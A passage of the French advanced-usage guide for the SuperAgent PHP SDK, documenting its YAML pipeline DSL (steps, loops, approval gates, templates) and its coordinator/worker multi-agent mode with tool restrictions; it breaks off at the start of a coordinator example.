# SuperAgent Guide d'Utilisation Avancée

> Documentation complète de toutes les fonctionnalités avancées du SDK SuperAgent. Ce guide couvre 25 fonctionnalités organisées en 7 catégories, de l'orchestration multi-agents aux outils de workflow de développement.

> **Langue**: [English](ADVANCED_USAGE.md) | [中文](ADVANCED_USAGE_CN.md) | [Français](ADVANCED_USAGE_FR.md)

## Table des Matières

### Multi-Agents & Orchestration

- [1. Pipeline DSL](#1-pipeline-dsl)
- [2. Mode Coordinateur](#2-mode-coordinateur)
- [3. Tâches & Déclencheurs d'Agents Distants](#3-tâches--déclencheurs-dagents-distants)

### Sécurité & Permissions

- [4. Système de Permissions](#4-système-de-permissions)
- [5. Système de Hooks](#5-système-de-hooks)
- [6. Guardrails DSL](#6-guardrails-dsl)
- [7. Validateur de Sécurité Bash](#7-validateur-de-sécurité-bash)

### Gestion des Coûts & Ressources

- [8. Pilote Automatique de Coûts](#8-pilote-automatique-de-coûts)
- [9. Continuation par Budget de Tokens](#9-continuation-par-budget-de-tokens)
- [10. Fenêtre de Contexte Intelligente](#10-fenêtre-de-contexte-intelligente)

### Intelligence & Apprentissage

- [11. Feedback Adaptatif](#11-feedback-adaptatif)
- [12. Distillation de Compétences](#12-distillation-de-compétences)
- [13. Système de Mémoire](#13-système-de-mémoire)
- [14. Graphe de Connaissances](#14-graphe-de-connaissances)
- [15. Pensée Étendue](#15-pensée-étendue)

### Infrastructure & Intégration

- [16. Intégration du Protocole MCP](#16-intégration-du-protocole-mcp)
- [17. Mode Bridge](#17-mode-bridge)
- [18. Télémétrie & Observabilité](#18-télémétrie--observabilité)
- [19. Recherche d'Outils & Chargement Différé](#19-recherche-doutils--chargement-différé)
- [20. Contexte Incrémental & Paresseux](#20-contexte-incrémental--paresseux)

### Workflow de Développement

- [21. Phase d'Entretien Plan V2](#21-phase-dentretien-plan-v2)
- [22. Checkpoint & Reprise](#22-checkpoint--reprise)
- [23. Historique des Fichiers](#23-historique-des-fichiers)

### Performance & Journalisation (v0.7.0)

- [24. Optimisation des Performances](#24-optimisation-des-performances)
- [25. Journalisation Structurée NDJSON](#25-journalisation-structurée-ndjson)

### Intelligence Innovante (v0.7.6)

- [26. Replay d'Agent & Débogage Temporel](#26-replay-dagent--débogage-temporel)
- [27. Fork de Conversation](#27-fork-de-conversation)
- [28. Protocole de Débat Agent](#28-protocole-de-débat-agent)
- [29. Moteur de Prédiction de Coûts](#29-moteur-de-prédiction-de-coûts)
- [30. Garde-fous en Langage Naturel](#30-garde-fous-en-langage-naturel)
- [31. Pipelines Auto-Réparateurs](#31-pipelines-auto-réparateurs)

---

## 1. Pipeline DSL

> Définissez des workflows multi-étapes d'agents sous forme de pipelines YAML déclaratifs avec résolution des dépendances, stratégies d'échec, portes d'approbation et boucles itératives de révision-correction.

### Vue d'ensemble

Le Pipeline DSL vous permet d'orchestrer des workflows d'agents complexes sans écrire de code PHP impératif. Vous définissez les pipelines en YAML, en spécifiant les étapes (appels d'agents, groupes parallèles, conditions, transformations, portes d'approbation, boucles), leurs dépendances et les stratégies d'échec. Le `PipelineEngine` résout l'ordre d'exécution via un tri topologique, gère le flux de données inter-étapes via des variables de template et émet des événements pour l'observabilité.

Classes principales :

| Classe | Rôle |
|---|---|
| `PipelineConfig` | Analyse et valide les fichiers YAML de pipeline |
| `PipelineDefinition` | Définition immuable d'un pipeline unique |
| `PipelineEngine` | Exécute les pipelines avec résolution des dépendances |
| `PipelineContext` | État d'exécution : entrées, résultats des étapes, résolution de templates |
| `PipelineResult` | Résultat d'une exécution complète de pipeline |
| `StepFactory` | Analyse les tableaux d'étapes YAML en objets `StepInterface` |

### Configuration

#### Structure du fichier YAML

```yaml
version: "1.0"

defaults:
  failure_strategy: abort   # abort | continue | retry
  timeout: 300              # secondes, par étape
  max_retries: 0            # nombre de tentatives par défaut

pipelines:
  pipeline-name:
    description: "Description lisible par un humain"
    inputs:
      - name: files
        type: array
        required: true
      - name: branch
        type: string
        default: "main"
    steps:
      - name: step-name
        agent: agent-type
        prompt: "Faire quelque chose avec {{inputs.files}}"
        # ... configuration spécifique à l'étape
    outputs:
      report: "{{steps.build-report.output}}"
    triggers:
      - event: push
    metadata:
      team: platform
```

#### Chargement de la configuration

```php
use SuperAgent\Pipeline\PipelineConfig;

// Fichier unique
$config = PipelineConfig::fromYamlFile('pipelines.yaml');

// Fichiers multiples (les fichiers suivants écrasent les pipelines de même nom)
$config = PipelineConfig::fromYamlFiles([
    'pipelines/base.yaml',
    'pipelines/team-overrides.yaml',
]);

// Depuis un tableau (utile pour les tests)
$config = PipelineConfig::fromArray([
    'version' => '1.0',
    'defaults' => ['failure_strategy' => 'abort'],
    'pipelines' => [
        'my-pipeline' => [
            'steps' => [/* ... */],
        ],
    ],
]);

// Valider
$errors = $config->validate();
if (!empty($errors)) {
    foreach ($errors as $error) {
        echo "Erreur de validation : {$error}\n";
    }
}
```

### Utilisation

#### Exécuter un pipeline

```php
use SuperAgent\Pipeline\PipelineConfig;
use SuperAgent\Pipeline\PipelineEngine;
use SuperAgent\Pipeline\Steps\AgentStep;
use SuperAgent\Pipeline\PipelineContext;

$config = PipelineConfig::fromYamlFile('pipelines.yaml');
$engine = new PipelineEngine($config);

// Définir le lanceur d'agent (requis pour les étapes d'agent)
$engine->setAgentRunner(function (AgentStep $step, PipelineContext $ctx): string {
    // Intégrez avec votre backend d'agent
    $spawnConfig = $step->buildSpawnConfig($ctx);
    return $backend->run($spawnConfig);
});

// Définir le gestionnaire d'approbation (optionnel ; auto-approuve si non défini)
$engine->setApprovalHandler(function (\SuperAgent\Pipeline\Steps\ApprovalStep $step, PipelineContext $ctx): bool {
    echo "Approbation nécessaire : {$step->getMessage()}\n";
    return readline("Approuver ? (y/n) ") === 'y';
});

// Enregistrer les écouteurs d'événements
$engine->on('pipeline.start', function (array $data) {
    echo "Démarrage du pipeline : {$data['pipeline']} ({$data['steps']} étapes)\n";
});

$engine->on('step.end', function (array $data) {
    echo "Étape {$data['step']} : {$data['status']} ({$data['duration_ms']}ms)\n";
});

// Exécuter le pipeline
$result = $engine->run('code-review', [
    'files' => ['src/App.php', 'src/Service.php'],
    'branch' => 'feature/new-api',
]);

// Vérifier les résultats
if ($result->isSuccessful()) {
    echo "Pipeline terminé !\n";
    $summary = $result->getSummary();
    echo "Étapes : {$summary['completed']} terminées, {$summary['failed']} échouées\n";
} else {
    echo "Pipeline échoué : {$result->error}\n";
}

// Accéder aux sorties individuelles des étapes
$scanOutput = $result->getStepOutput('security-scan');
$allOutputs = $result->getAllOutputs();
```

### Référence YAML

#### Types d'étapes

##### 1. Étape Agent

Exécute un agent nommé avec un template de prompt.

```yaml
- name: security-scan
  agent: security-scanner          # nom du type d'agent
  prompt: "Scanner {{inputs.files}} pour les vulnérabilités"
  model: claude-haiku-4-5-20251001         # optionnel : remplacer le modèle
  system_prompt: "Vous êtes un expert en sécurité" # optionnel
  isolation: subprocess            # optionnel : subprocess | docker | none
  read_only: true                  # optionnel : restreindre aux outils en lecture seule
  allowed_tools:                   # optionnel : restreindre les outils disponibles
    - Read
    - Grep
    - Glob
  input_from:                      # optionnel : injecter le contexte des étapes précédentes
    scan_results: "{{steps.scan.output}}"
    config: "{{steps.load-config.output}}"
  on_failure: retry                # abort | continue | retry
  max_retries: 2
  timeout: 120
  depends_on:
    - load-config
```

La carte `input_from` est ajoutée au prompt sous forme de sections de contexte étiquetées :

```
## Contexte des étapes précédentes

### scan_results
<sortie résolue de steps.scan>

### config
<sortie résolue de steps.load-config>
```

##### 2. Étape Parallèle

Exécute plusieurs sous-étapes simultanément (actuellement séquentiel en PHP, mais sémantiquement parallèle).

```yaml
- name: all-checks
  parallel:
    - name: security-scan
      agent: security-scanner
      prompt: "Vérifier les problèmes de sécurité"
    - name: style-check
      agent: style-checker
      prompt: "Vérifier le style du code"
    - name: test-coverage
      agent: test-runner
      prompt: "Exécuter les tests et rapporter la couverture"
  wait_all: true                   # défaut : true ; attendre toutes les sous-étapes
  on_failure: continue
```

##### 3. Étape Conditionnelle

Encapsule n'importe quelle étape avec une clause `when`. L'étape est ignorée si la condition n'est pas remplie.

```yaml
- name: deploy
  when:
    step_succeeded: all-tests      # uniquement si all-tests a réussi
  agent: deployer
  prompt: "Déployer les changements"
  depends_on:
    - all-tests

- name: notify-failure
  when:
    step_failed: all-tests         # uniquement si all-tests a échoué
  agent: notifier
  prompt: "Notifier l'équipe : {{steps.all-tests.error}}"

- name: production-deploy
  when:
    input_equals:
      field: environment
      value: production
  agent: deployer
  prompt: "Déployer en production"

- name: hotfix
  when:
    expression:
      left: "{{steps.scan.status}}"
      operator: eq
      right: completed
  agent: fixer
  prompt: "Appliquer le correctif"
```

Types de conditions :

| Type | Format | Description |
|---|---|---|
| `step_succeeded` | `step_succeeded: step-name` | Vrai si l'étape nommée s'est terminée avec succès |
| `step_failed` | `step_failed: step-name` | Vrai si l'étape nommée a échoué |
| `input_equals` | `{ field: "key", value: "expected" }` | Vrai si l'entrée du pipeline correspond |
| `output_contains` | `{ step: "name", contains: "text" }` | Vrai si la sortie de l'étape contient la sous-chaîne |
| `expression` | `{ left, operator, right }` | Comparaison (eq, neq, contains, gt, gte, lt, lte) |

##### 4. Étape d'Approbation

Met en pause le pipeline et attend l'approbation humaine.

```yaml
- name: deploy-gate
  approval:
    message: "Toutes les vérifications sont passées. Déployer en production ?"
    required_approvers: 1
    timeout: 3600                  # secondes d'attente pour l'approbation
  depends_on:
    - all-checks
```

Si aucun callback `approvalHandler` n'est enregistré sur le moteur, les portes d'approbation sont auto-approuvées avec un avertissement.

##### 5. Étape de Transformation

Agrège ou restructure les données des étapes précédentes sans appeler un agent.

```yaml
## Fusionner plusieurs sorties
- name: aggregate
  transform:
    type: merge
    sources:
      security: "{{steps.security-scan.output}}"
      style: "{{steps.style-check.output}}"
      tests: "{{steps.test-coverage.output}}"

## Construire un rapport depuis un template
- name: report
  transform:
    type: template
    template: |
      # Rapport de Revue de Code
      ## Sécurité : {{steps.security-scan.status}}
      {{steps.security-scan.output}}
      ## Style : {{steps.style-check.status}}
      {{steps.style-check.output}}

## Extraire un champ de la sortie d'une étape
- name: get-score
  transform:
    type: extract
    step: analysis
    field: score

## Mapper sur une sortie de type tableau
- name: format-items
  transform:
    type: map
    step: list-step
    template: "- {{vars.item}}"
```

Types de transformations :

| Type | Description |
|---|---|
| `merge` | Combiner plusieurs sorties d'étapes en un objet via la carte `sources` |
| `template` | Rendre un template de chaîne avec résolution de variables `{{...}}` |
| `extract` | Extraire un `field` spécifique de la sortie d'une `step` |
| `map` | Appliquer un template à chaque élément d'une sortie de type tableau |

##### 6. Étape de Boucle

Répète un corps d'étapes jusqu'à ce qu'une condition de sortie soit remplie ou que la limite d'itérations soit atteinte. Conçu pour les cycles de révision-correction.

```yaml
- name: review-fix-loop
  loop:
    max_iterations: 5              # requis : empêche les boucles infinies
    exit_when:
      output_contains:
        step: review
        contains: "LGTM"
    steps:
      - name: review
        agent: reviewer
        prompt: "Réviser le code pour les bugs"
      - name: fix
        agent: code-writer
        prompt: "Corriger les problèmes : {{steps.review.output}}"
        when:
          expression:
            left: "{{steps.review.output}}"
            operator: contains
            right: "BUG"
```

**Boucle de révision multi-modèles :**

```yaml
- name: multi-review-loop
  loop:
    max_iterations: 3
    exit_when:
      all_passed:
        - step: claude-review
          contains: "LGTM"
        - step: gpt-review
          contains: "LGTM"
    steps:
      - name: reviews
        parallel:
          - name: claude-review
            agent: reviewer
            model: claude-sonnet-4-20250514
            prompt: "Réviser pour les bugs logiques"
          - name: gpt-review
            agent: reviewer
            model: gpt-4o
            prompt: "Réviser pour les problèmes de sécurité"
      - name: fix
        agent: code-writer
        prompt: "Corriger tous les problèmes trouvés"
        input_from:
          claude: "{{steps.claude-review.output}}"
          gpt: "{{steps.gpt-review.output}}"
```

Types de conditions de sortie :

| Type | Format | Description |
|---|---|---|
| `output_contains` | `{ step, contains }` | La sortie de l'étape contient une sous-chaîne |
| `output_not_contains` | `{ step, contains }` | La sortie de l'étape NE contient PAS une sous-chaîne |
| `expression` | `{ left, operator, right }` | Expression de comparaison |
| `all_passed` | Tableau de `{ step, contains }` | TOUTES les étapes listées contiennent leurs sous-chaînes |
| `any_passed` | Tableau de `{ step, contains }` | N'IMPORTE QUELLE étape listée contient sa sous-chaîne |

Les métadonnées d'itération de boucle sont accessibles dans les templates :

- `{{loop.<loop-name>.iteration}}` -- numéro d'itération actuel (base 1)
- `{{loop.<loop-name>.max}}` -- nombre maximum d'itérations configuré

Chaque itération écrase les résultats de l'itération précédente, donc `{{steps.review.output}}` fait toujours référence à l'itération la plus récente.

#### Stratégies d'échec

| Stratégie | Comportement |
|---|---|
| `abort` | Arrêter le pipeline immédiatement en cas d'échec d'une étape |
| `continue` | Journaliser l'échec et passer à l'étape suivante |
| `retry` | Réessayer l'étape jusqu'à `max_retries` fois avant d'appliquer abort/continue |

#### Résolution des dépendances

Les étapes peuvent déclarer des dépendances via `depends_on`. Le moteur utilise un tri topologique (algorithme de Kahn) pour déterminer l'ordre d'exécution. Si aucune dépendance n'existe, les étapes s'exécutent dans leur ordre de déclaration.

```yaml
steps:
  - name: scan
    agent: scanner
    prompt: "Scanner le code"

  - name: review
    agent: reviewer
    prompt: "Réviser {{steps.scan.output}}"
    depends_on:
      - scan

  - name: fix
    agent: fixer
    prompt: "Corriger {{steps.review.output}}"
    depends_on:
      - review
```

Si une dépendance ne s'est pas terminée avec succès, l'étape dépendante est ignorée avec un message "Dépendances non satisfaites".

Les dépendances circulaires sont détectées et journalisées ; le moteur revient à l'ordre de déclaration original.

#### Flux de données inter-étapes (Templates)

Les templates utilisent la syntaxe `{{...}}` et sont résolus à l'exécution par `PipelineContext` :

| Modèle | Description |
|---|---|
| `{{inputs.key}}` | Valeur d'entrée du pipeline |
| `{{steps.name.output}}` | Sortie de l'étape (chaîne ou encodée en JSON) |
| `{{steps.name.status}}` | Statut de l'étape : `completed`, `failed`, `skipped` |
| `{{steps.name.error}}` | Message d'erreur de l'étape (si échouée) |
| `{{vars.key}}` | Variable personnalisée définie pendant l'exécution |
| `{{loop.name.iteration}}` | Itération actuelle de la boucle (base 1) |
| `{{loop.name.max}}` | Nombre maximum d'itérations d'une boucle |

Les espaces réservés non résolus sont conservés tels quels dans la chaîne de sortie. Les valeurs tableau/objet sont encodées en JSON.

#### Sorties du pipeline

Définissez des templates de sortie qui sont résolus après la fin du pipeline :

```yaml
pipelines:
  code-review:
    outputs:
      report: "{{steps.build-report.output}}"
      score: "{{steps.scoring.output}}"
    steps:
      # ...
```

Résolvez-les en PHP :

```php
$result = $engine->run('code-review', $inputs);
$context = new PipelineContext($inputs);
// ... remplir le contexte avec les résultats des étapes
$outputs = $pipeline->resolveOutputs($context);
```

#### Écouteurs d'événements

Le moteur émet des événements tout au long de l'exécution. Enregistrez des écouteurs avec `$engine->on()` :

| Événement | Clés de données | Description |
|---|---|---|
| `pipeline.start` | `pipeline`, `inputs`, `steps` | L'exécution du pipeline commence |
| `pipeline.end` | `pipeline`, `status`, `duration_ms`, `summary` | L'exécution du pipeline se termine |
| `step.start` | `step`, `description` | Une étape commence son exécution |
| `step.end` | `step`, `status`, `duration_ms` | Une étape se termine |
| `step.retry` | `step`, `attempt`, `max_attempts`, `error` | Une étape est réessayée |
| `step.skip` | `step` | Une étape est ignorée |
| `loop.iteration` | `loop`, `iteration`, `max_iterations` | Une itération de boucle commence |

```php
$engine->on('step.retry', function (array $data) {
    $logger->warning("Nouvelle tentative pour {$data['step']}", [
        'attempt' => $data['attempt'],
        'error' => $data['error'],
    ]);
});

$engine->on('loop.iteration', function (array $data) {
    echo "Boucle {$data['loop']} : itération {$data['iteration']}/{$data['max_iterations']}\n";
});
```

### Référence API

#### `PipelineConfig`

| Méthode | Description |
|---|---|
| `fromYamlFile(string $path): self` | Charger depuis un fichier YAML |
| `fromYamlFiles(array $paths): self` | Fusionner plusieurs fichiers YAML |
| `fromArray(array $data): self` | Charger depuis un tableau |
| `validate(): string[]` | Valider et retourner les messages d'erreur |
| `getPipeline(string $name): ?PipelineDefinition` | Obtenir un pipeline par nom |
| `getPipelines(): PipelineDefinition[]` | Obtenir tous les pipelines |
| `getPipelineNames(): string[]` | Obtenir tous les noms de pipelines |
| `getVersion(): string` | Version de la configuration |
| `getDefaultTimeout(): int` | Timeout par défaut en secondes |
| `getDefaultFailureStrategy(): string` | Stratégie d'échec par défaut |

#### `PipelineEngine`

| Méthode | Description |
|---|---|
| `__construct(PipelineConfig $config, ?LoggerInterface $logger)` | Créer le moteur |
| `setAgentRunner(callable $runner): void` | Définir le callback d'exécution d'agent : `fn(AgentStep, PipelineContext): string` |
| `setApprovalHandler(callable $handler): void` | Définir le callback d'approbation : `fn(ApprovalStep, PipelineContext): bool` |
| `on(string $event, callable $listener): void` | Enregistrer un écouteur d'événement |
| `run(string $pipelineName, array $inputs): PipelineResult` | Exécuter un pipeline nommé |
| `reload(PipelineConfig $config): void` | Rechargement à chaud de la configuration |
| `getPipelineNames(): string[]` | Lister les pipelines disponibles |
| `getPipeline(string $name): ?PipelineDefinition` | Obtenir une définition de pipeline |
| `getStatistics(): array` | Obtenir les compteurs `{pipelines, total_steps}` |

#### `PipelineResult`

| Méthode | Description |
|---|---|
| `isSuccessful(): bool` | Vrai si le statut est `completed` |
| `getStepResults(): StepResult[]` | Tous les résultats d'étapes |
| `getStepResult(string $name): ?StepResult` | Résultat d'une étape spécifique |
| `getStepOutput(string $name): mixed` | Sortie d'une étape spécifique |
| `getAllOutputs(): array` | Toutes les sorties indexées par nom d'étape |
| `getSummary(): array` | Résumé avec compteurs de terminées/échouées/ignorées |

#### `PipelineDefinition`

| Méthode | Description |
|---|---|
| `validateInputs(array $inputs): string[]` | Valider les entrées requises |
| `applyInputDefaults(array $inputs): array` | Appliquer les valeurs par défaut |
| `resolveOutputs(PipelineContext $ctx): array` | Résoudre les templates de sortie |
| `hasTrigger(string $event): bool` | Vérifier si le pipeline a un déclencheur |

### Exemples

#### Pipeline complet de revue de code

```yaml
version: "1.0"

defaults:
  failure_strategy: continue
  timeout: 120

pipelines:
  code-review:
    description: "Revue de code automatisée avec scan de sécurité, vérification de style et rapport"
    inputs:
      - name: files
        type: array
        required: true
      - name: branch
        type: string
        default: "main"

    steps:
      - name: security-scan
        agent: security-scanner
        prompt: "Scanner ces fichiers pour les vulnérabilités de sécurité : {{inputs.files}}"
        model: claude-haiku-4-5-20251001
        read_only: true
        timeout: 60

      - name: style-check
        agent: style-checker
        prompt: "Vérifier le style du code dans : {{inputs.files}}"
        read_only: true
        timeout: 60

      - name: review-fix-loop
        loop:
          max_iterations: 3
          exit_when:
            output_contains:
              step: review
              contains: "LGTM"
          steps:
            - name: review
              agent: code-reviewer
              prompt: "Réviser le code pour les bugs et erreurs logiques"
            - name: fix
              agent: code-writer
              prompt: "Corriger les problèmes trouvés : {{steps.review.output}}"
              when:
                expression:
                  left: "{{steps.review.output}}"
                  operator: contains
                  right: "ISSUE"
        depends_on:
          - security-scan
          - style-check

      - name: deploy-gate
        approval:
          message: "Revue terminée. Déployer la branche {{inputs.branch}} ?"
          timeout: 3600
        depends_on:
          - review-fix-loop

      - name: build-report
        transform:
          type: template
          template: |
            # Rapport de Revue de Code
            Branche : {{inputs.branch}}
            ## Sécurité : {{steps.security-scan.status}}
            {{steps.security-scan.output}}
            ## Style : {{steps.style-check.status}}
            {{steps.style-check.output}}
            ## Boucle de Révision
            {{steps.review-fix-loop.output}}
        depends_on:
          - review-fix-loop

    outputs:
      report: "{{steps.build-report.output}}"

    triggers:
      - event: pull_request
```

### Dépannage

**"Pipeline 'name' not found"** -- Le nom du pipeline n'existe pas dans la configuration chargée. Vérifiez le fichier YAML et assurez-vous que `PipelineConfig` a été chargé avec succès.

**"Missing required input: 'x'"** -- Le pipeline déclare une entrée requise qui n'a pas été fournie à `$engine->run()`.

**"Step 'x' must specify one of: agent, parallel, approval, transform, loop"** -- La définition de l'étape YAML ne contient pas de clé de type reconnue.

**"Circular dependency detected"** -- Deux étapes ou plus dépendent l'une de l'autre. Le moteur journalise un avertissement et revient à l'ordre de déclaration.

**"AgentStep::runAgent() should not be called directly"** -- Vous devez utiliser `PipelineEngine` et définir un lanceur d'agent via `setAgentRunner()`. Les étapes d'agent ne peuvent pas s'exécuter de manière autonome.

**"No approval handler configured, auto-approving"** -- Enregistrez un `approvalHandler` sur le moteur si vous avez besoin de portes d'approbation avec intervention humaine.

---

## 2. Mode Coordinateur

> Architecture à double mode séparant l'orchestration (Coordinateur) de l'exécution (Worker), avec restrictions d'outils, workflow en 4 phases et persistance de session.

### Vue d'ensemble

Le Mode Coordinateur implémente une séparation stricte entre **l'orchestration** et **l'exécution**. Lorsqu'il est activé, l'agent de niveau supérieur devient un coordinateur pur qui n'exécute jamais de tâches directement. Au lieu de cela, il :

1. **Génère** des agents workers indépendants via l'outil `Agent`
2. **Reçoit** les résultats sous forme de notifications de tâches
3. **Synthétise** les résultats en spécifications d'implémentation
4. **Délègue** tout le travail aux workers

Cette architecture empêche le coordinateur de se perdre dans les détails d'implémentation et garantit que chaque worker opère avec un contexte ciblé et autonome.

#### Architecture à double mode

```
                     +-------------------+
                     |   COORDINATEUR    |
                     | (Agent, SendMsg,  |
                     |  TaskStop uniquem)|
                     +--------+----------+
                              |
              +---------------+---------------+
              |               |               |
       +------+------+ +-----+-------+ +-----+-------+
       |  WORKER A   | |  WORKER B   | |  WORKER C   |
       | (Bash, Read,| | (Bash, Read,| | (Bash, Read,|
       |  Edit, etc.)| |  Edit, etc.)| |  Edit, etc.)|
       +-------------+ +-------------+ +-------------+
```

| Rôle | Outils disponibles | Objectif |
|------|----------------|---------|
| **Coordinateur** | `Agent`, `SendMessage`, `TaskStop` | Orchestrer, synthétiser, déléguer |
| **Worker** | `Bash`, `Read`, `Edit`, `Write`, `Grep`, `Glob`, etc. | Exécuter les tâches directement |

Les workers n'ont jamais accès à `SendMessage`, `TeamCreate` ou `TeamDelete` (outils d'orchestration internes).

### Configuration

#### Activer le mode coordinateur

```php
use SuperAgent\Coordinator\CoordinatorMode;

// Activer via le constructeur
$coordinator = new CoordinatorMode(coordinatorMode: true);

// Activer via une variable d'environnement
// export CLAUDE_CODE_COORDINATOR_MODE=1
// ou
// export CLAUDE_CODE_COORDINATOR_MODE=true
$coordinator = new CoordinatorMode(); // détecte automatiquement depuis l'environnement

// Activer/désactiver à l'exécution
$coordinator->enable();
$coordinator->disable();

// Vérifier l'état actuel
$coordinator->isCoordinatorMode(); // true ou false
$coordinator->getSessionMode();     // 'coordinator' ou 'normal'
```

#### Utiliser la définition CoordinatorAgent

Pour un agent coordinateur pré-configuré :

```php
use SuperAgent\Agent\BuiltinAgents\CoordinatorAgent;

$agent = new CoordinatorAgent();
$agent->name();          // 'coordinator'
$agent->description();   // 'Orchestrator that delegates work to worker agents'
$agent->allowedTools();  // ['Agent', 'SendMessage', 'TaskStop']
$agent->readOnly();      // true (le coordinateur n'écrit jamais de fichiers)
$agent->category();      // 'orchestration'
$agent->systemPrompt();  // Prompt système complet du coordinateur
```

### Utilisation

#### Filtrage des outils

La classe `CoordinatorMode` gère la restriction des outils pour les deux côtés :

```php
$coordinator = new CoordinatorMode(coordinatorMode: true);

// Filtrer les outils pour le coordinateur (outils d'orchestration uniquement)
$coordTools = $coordinator->filterCoordinatorTools($allTools);
// Uniquement : Agent, SendMessage, TaskStop

// Filtrer les outils pour les workers (retirer les outils d'orchestration internes)
$workerTools = $coordinator->filterWorkerTools($allTools);
// Tout sauf : SendMessage, TeamCreate, TeamDelete

// Obtenir les noms des outils worker (pour injection dans le contexte du coordinateur)
$workerToolNames = $coordinator->getWorkerToolNames($allTools);
// ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob', ...]
```

#### Prompt système

Le prompt système du coordinateur définit le protocole d'orchestration complet :

```php
$coordinator = new CoordinatorMode(true);

$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob'],
    scratchpadDir: '/tmp/scratchpad',
);
```

#### Message de contexte utilisateur

Injecté comme premier message utilisateur pour informer le coordinateur des capacités des workers :

```php
$userContext = $coordinator->getUserContext(
    workerToolNames: ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob'],
    mcpToolNames: ['mcp_github_create_pr', 'mcp_linear_create_issue'],
    scratchpadDir: '/tmp/scratchpad',
);
// "Workers spawned via the Agent tool have access to these tools: Bash, Read, Edit, ...
//  Workers also have access to MCP tools: mcp_github_create_pr, mcp_linear_create_issue
//  Scratchpad directory: /tmp/scratchpad ..."
```

#### Persistance du mode de session

Lors de la reprise d'une session, le mode coordinateur doit correspondre à l'état stocké de la session :

```php
$coordinator = new CoordinatorMode();

// Reprendre une session coordinateur
$warning = $coordinator->matchSessionMode('coordinator');
// Retourne : "Entered coordinator mode to match resumed session."

// Reprendre une session normale en mode coordinateur
$coordinator->enable();
$warning = $coordinator->matchSessionMode('normal');
// Retourne : "Exited coordinator mode to match resumed session."

// Aucun changement nécessaire
$warning = $coordinator->matchSessionMode('normal');
// Retourne : null (déjà en mode normal)
```

### Le workflow en 4 phases

Le prompt système du coordinateur définit un workflow strict :

#### Phase 1 : Recherche

| Propriétaire | Workers (en parallèle) |
|-------|-------------------|
| **Objectif** | Investiguer le codebase indépendamment |
| **Comment** | Générer plusieurs workers en lecture seule en UN SEUL message |

```
Coordinateur : "J'ai besoin de comprendre le système de paiement. Lançons des workers de recherche."

Worker A : Investiguer la structure du répertoire src/Payment/ et les classes clés
Worker B : Lire tous les fichiers de test dans tests/Payment/ pour le comportement attendu
Worker C : Vérifier les fichiers de configuration et les variables d'environnement pour les paramètres de paiement
```

#### Phase 2 : Synthèse

| Propriétaire | Coordinateur |
|-------|-------------|
| **Objectif** | Lire les résultats, comprendre le problème, rédiger les spécifications d'implémentation |
| **Comment** | Lire tous les résultats des workers, puis écrire des spécifications d'implémentation spécifiques |

Le coordinateur **ne délègue jamais la compréhension**. Il lit tous les résultats de recherche et formule un plan concret avec les chemins de fichiers, numéros de lignes, types et justification.

#### Phase 3 : Implémentation

| Propriétaire | Workers |
|-------|---------|
| **Objectif** | Effectuer les modifications selon les spécifications du coordinateur |
| **Comment** | Écritures séquentielles -- un seul worker d'écriture par ensemble de fichiers à la fois |

```
Coordinateur : "D'après mon analyse, voici la spécification d'implémentation :
  Fichier : src/Payment/StripeGateway.php, ligne 45
  Changement : Ajouter la vérification de signature du webhook avant le traitement
  Type : Ajouter la méthode verifyWebhookSignature(string $payload, string $signature): bool
  Pourquoi : L'implémentation actuelle traite les webhooks sans vérification (risque de sécurité)"
```

#### Phase 4 : Vérification

| Propriétaire | Workers frais |
|-------|--------------|
| **Objectif** | Tester les changements indépendamment |
| **Comment** | Toujours utiliser un worker frais (perspective indépendante) |

```
Coordinateur : "Générer un worker frais pour exécuter la suite de tests et vérifier les changements."

Worker D (frais) : Exécuter les tests, vérifier les régressions, valider le nouveau comportement
```

### Décision Continuer vs. Générer

Le coordinateur doit décider s'il continue un worker existant ou en génère un nouveau :

| Situation | Action | Pourquoi |
|-----------|--------|-----|
| La recherche a exploré les fichiers nécessitant une modification | **Continuer** (SendMessage) | Le worker a les fichiers en contexte |
| La recherche était large, l'implémentation est précise | **Générer un nouveau** | Éviter de traîner du bruit |
| Corriger un échec ou étendre le travail | **Continuer** | Le worker sait ce qu'il a essayé |
| Vérifier le code d'un autre worker | **Générer un nouveau** | Perspective indépendante |
| Approche complètement erronée | **Générer un nouveau** | Table rase |

#### Notifications de tâches

Quand un worker termine, le coordinateur reçoit une notification XML :

```xml
<task-notification>
  <task-id>agent-xxx</task-id>
  <status>completed|failed|killed</status>
  <summary>Résultat lisible par un humain</summary>
  <result>Réponse finale de l'agent</result>
</task-notification>
```

#### Répertoire scratchpad

Les workers peuvent partager des informations via un répertoire scratchpad :

```php
$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: $toolNames,
    scratchpadDir: '/tmp/project-scratchpad',
);
// Les workers peuvent lire et écrire dans le scratchpad sans invite de permission.
// Utilisez ceci pour les connaissances durables inter-workers.
```

### Référence API

#### `CoordinatorMode`

| Méthode | Retour | Description |
|--------|--------|-------------|
| `isCoordinatorMode()` | `bool` | Si le mode coordinateur est actif |
| `enable()` | `void` | Activer le mode coordinateur |
| `disable()` | `void` | Désactiver le mode coordinateur |
| `getSessionMode()` | `string` | `'coordinator'` ou `'normal'` |
| `matchSessionMode(string $storedMode)` | `?string` | Correspondre au mode de session stocké ; retourne un avertissement en cas de changement |
| `filterCoordinatorTools(array $tools)` | `array` | Filtrer aux outils d'orchestration uniquement |
| `filterWorkerTools(array $tools)` | `array` | Retirer les outils d'orchestration internes |
| `getWorkerToolNames(array $tools)` | `string[]` | Obtenir les noms d'outils disponibles pour les workers |
| `getSystemPrompt(array $workerToolNames, ?string $scratchpadDir)` | `string` | Obtenir le prompt système complet du coordinateur |
| `getUserContext(array $workerToolNames, array $mcpToolNames, ?string $scratchpadDir)` | `string` | Obtenir le message d'injection de contexte utilisateur |

#### Constantes

| Constante | Valeur | Description |
|----------|-------|-------------|
| `COORDINATOR_TOOLS` | `['Agent', 'SendMessage', 'TaskStop']` | Outils disponibles pour le coordinateur |

#### `CoordinatorAgent` (AgentDefinition)

| Méthode | Retour | Description |
|--------|--------|-------------|
| `name()` | `string` | `'coordinator'` |
| `description()` | `string` | Description de l'agent |
| `systemPrompt()` | `?string` | Prompt système complet du coordinateur |
| `allowedTools()` | `?array` | `['Agent', 'SendMessage', 'TaskStop']` |
| `readOnly()` | `bool` | `true` |
| `category()` | `string` | `'orchestration'` |

### Exemples

#### Configurer une session coordinateur

```php
